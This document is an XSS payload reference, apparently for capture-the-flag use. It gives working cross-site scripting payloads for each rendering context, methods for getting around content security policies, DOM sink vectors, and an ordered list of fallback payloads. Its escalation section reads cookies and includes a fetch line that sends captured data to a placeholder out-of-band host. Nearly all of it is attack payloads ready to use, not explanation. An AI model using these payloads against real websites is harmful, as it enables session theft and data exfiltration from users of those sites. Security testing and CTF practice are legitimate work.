# XSS Payload Reference

## Rendering Context Table

| Observed in response | Context | Base payload |
|---|---|---|
| `CANARY` inside tag body | HTML | `<img src=x onerror=alert(1)>` |
| `value="CANARY"` | HTML attribute | `" onmouseover="alert(1)` |
| `var x = "CANARY"` | JS string | `";alert(1)//` |
| `href="CANARY"` | URL | `javascript:alert(1)` |
| Reflected in JSON response | DOM via JS | see DOM XSS section below |

## CSP Strategy Table

| CSP | Strategy |
|---|---|
| None | `<script>` payloads work |
| `script-src 'self'` | `<img onerror>`, `<svg onload>`, or JSONP |
| `script-src 'nonce-X'` | need nonce leak or same-origin file write |
| `default-src 'none'` | very restricted — try DNS-only OOB |
| `script-src 'unsafe-eval'` | `eval`-based payloads, `setTimeout('alert(1)')` |
| `img-src` allows external but `connect-src` doesn't | use image beacon instead of `fetch` |

## DOM XSS Vectors

Common DOM sinks to grep for:
```
innerHTML | outerHTML | document.write | eval | setTimeout | location.hash | location.search
```

Vectors:
- URL fragment: `URL#<img src=x onerror=alert(1)>`
- `location.search` to `innerHTML`: `URL?q=<img src=x onerror=alert(1)>`
- `postMessage` handlers: inject via iframe + postMessage

## Manual Fallback Payloads

Try these in order, one per endpoint:
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover="alert(1)
javascript:alert(1)
{{constructor.constructor('alert(1)')()}}
${alert(1)}
<details open ontoggle=alert(1)>
```

## Escalation Payloads (once XSS is confirmed)

```js
// Verify cookie access
alert(document.cookie)

// Verify execution scope
alert(document.domain)

// Fetch flag from JS-accessible endpoint
fetch('/FLAG_ENDPOINT_FROM_RECON').then(r=>r.text()).then(d=>fetch('http://OOB_URL/?f='+btoa(d)))
```
